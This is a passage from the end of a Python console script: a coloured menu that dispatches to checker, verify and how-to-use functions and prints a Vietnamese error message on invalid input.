3:\033[1;32;40mHOW TO USE ?\033[0m''')
    choice = input('==> ')
    if choice == '1':
        checker_choice()
    elif choice == '2':
        verify_choice()
    elif choice == '3':
        howtouse()
    else:
        print('Vui lòng chọn một số hợp lệ như 1,2 hoặc 3!')
        time.sleep(1)
        clear()
        sys.exit()
main()